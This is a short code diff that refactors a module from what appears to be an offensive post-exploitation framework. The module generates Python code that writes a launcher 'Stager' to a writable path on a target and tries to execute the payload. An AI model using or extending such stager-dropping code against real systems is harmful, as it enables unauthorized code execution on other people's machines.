@@ -36,7 +36,7 @@ class Module:
         launcher = launcher.replace('"', '\\"')
         fullPath = params["WriteablePath"] + params["FileName"]
         fileName = params["FileName"]
-        script = f"""
+        return f"""
 import os
 print("Writing Stager to {fileName}...")
 file = open("{fullPath}","w")
@@ -50,5 +50,3 @@ except:
 	print("[!] Could not execute payload!")
 
 	"""
-
-        return script
